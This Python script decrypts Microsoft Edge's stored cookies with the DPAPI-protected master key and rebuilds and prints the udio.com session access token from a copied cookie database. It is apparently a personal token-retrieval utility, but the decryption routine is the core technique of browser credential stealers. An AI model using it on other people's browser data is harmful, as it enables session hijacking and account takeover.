import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

def get_master_key():
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove DPAPI prefix
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def decrypt_cookie(value, master_key):
    try:
        iv = value[3:15]
        payload = value[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_value = decrypt_payload(cipher, payload)[:-16].decode()
        return decrypted_value
    except Exception as e:
        return f"Error: {e}"

def extract_udio_token():
    temp_path = "edge_cookies_manual.db"
    if not os.path.exists(temp_path):
        print(f"Error: {temp_path} not found.")
        return None
    
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    
    # Check multiple possible host keys
    hosts = ['.udio.com', 'www.udio.com', '.www.udio.com']
    placeholders = ', '.join(['?'] * len(hosts))
    
    query = f"SELECT name, encrypted_value FROM cookies WHERE host_key IN ({placeholders}) AND (name LIKE 'sb-ssr-production-auth-token.%%' OR name LIKE 'sb-api-auth-token%%')"
    cursor.execute(query, hosts)
    
    rows = cursor.fetchall()
    if not rows:
        print("No Udio auth cookies found in database.")
        conn.close()
        return None

    master_key = get_master_key()
    
    # Sort by name (sb-ssr-production-auth-token.0, .1 etc)
    rows.sort(key=lambda x: x[0])
    
    combined_b64 = ""
    for name, encrypted_value in rows:
        decrypted = decrypt_cookie(encrypted_value, master_key)
        if decrypted.startswith("base64-"):
            combined_b64 += decrypted[7:]
        else:
            combined_b64 += decrypted

    conn.close()
    
    if not combined_b64:
        print("Could not extract cookie values.")
        return None

    # Fix padding
    combined_b64 += "=" * ((4 - len(combined_b64) % 4) % 4)
    
    try:
        decoded_json = base64.b64decode(combined_b64).decode('utf-8', errors='ignore')
        data = json.loads(decoded_json)
        return data.get("access_token")
    except Exception as e:
        if combined_b64.startswith("eyJ"):
            return combined_b64
        print(f"Error parsing token: {e}")
        return None

if __name__ == "__main__":
    token = extract_udio_token()
    if token:
        print(f"TOKEN_FOUND:{token}")
    else:
        print("TOKEN_NOT_FOUND")
